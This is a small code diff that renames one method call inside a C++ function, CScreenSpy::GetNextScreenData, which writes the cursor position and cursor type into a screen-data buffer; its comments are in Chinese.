@@ -156,7 +156,7 @@ LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
 	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));
 
 	// 写入当前光标类型
-	BYTE	bCursorIndex = m_CursorInfor.GetCurrentCursorIndex();
+	BYTE	bCursorIndex = m_CursorInfor.getCurrentCursorIndex();
 	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));
 
 	// 差异比较算法
